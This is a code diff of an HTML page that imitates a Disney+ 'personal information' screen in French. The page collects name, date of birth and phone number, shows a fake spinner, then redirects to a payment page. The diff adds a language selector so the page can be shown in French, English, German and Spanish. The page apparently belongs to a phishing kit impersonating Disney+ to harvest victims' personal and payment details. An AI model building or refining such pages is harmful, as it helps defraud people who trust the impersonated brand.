@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Informations personnelles | Disney+</title>
+  <title data-i18n-key="infoTitle">Informations personnelles | Disney+</title>
   <style>
     body {
       margin: 0;
@@ -14,6 +14,21 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
+    }
+
+    .lang-container {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      font-family: Arial, sans-serif;
+      z-index: 1000;
+      color: #fff;
+    }
+    .lang-container select {
+      margin-left: 8px;
+      padding: 4px 8px;
+      border-radius: 4px;
+      border: none;
     }
 
     .logo {
@@ -89,11 +104,10 @@
       position: fixed;
       inset: 0;
       background: rgba(0, 0, 0, 0.9);
-      display: flex;
+      display: none;
       align-items: center;
       justify-content: center;
       z-index: 9999;
-      display: none;
     }
 
     .spinner {
@@ -111,12 +125,22 @@
   </style>
 </head>
 <body>
+  <!-- Sélecteur de langue persistant -->
+  <div class="lang-container">
+    <label for="lang-select" data-i18n-key="langLabel">Langue :</label>
+    <select id="lang-select">
+      <option value="fr">Français</option>
+      <option value="en">English</option>
+      <option value="de">Deutsch</option>
+      <option value="es">Español</option>
+    </select>
+  </div>
 
-  <!-- ✅ Logo Disney+ blanc uniquement -->
+  <!-- Logo Disney+ -->
   <img src="Images/compose2.png" alt="Disney+" class="logo" />
 
   <main>
-    <h1>Informations personnelles</h1>
+    <h1 data-i18n-key="infoTitle">Informations personnelles</h1>
 
     <form id="infoForm">
       <input type="text" placeholder="Nom" required />
@@ -132,7 +156,7 @@
       </select>
       <input type="date" placeholder="Date de naissance" required />
       <input type="tel" placeholder="Téléphone" required />
-      <button type="submit">Continuer</button>
+      <button type="submit" data-i18n-key="infoBtn">Continuer</button>
     </form>
   </main>
 
@@ -141,15 +165,15 @@
     <div class="spinner"></div>
   </div>
 
+  <!-- i18n init -->
+  <script src="i18n.js"></script>
   <script>
+    // Spinner + redirection
     document.getElementById("infoForm").addEventListener("submit", function(e) {
       e.preventDefault();
       document.getElementById("spinnerOverlay").style.display = "flex";
-      setTimeout(() => {
-        window.location.href = "paiement.html";
-      }, 2500);
+      setTimeout(() => window.location.href = "paiement.html", 2500);
     });
   </script>
-
 </body>
 </html>
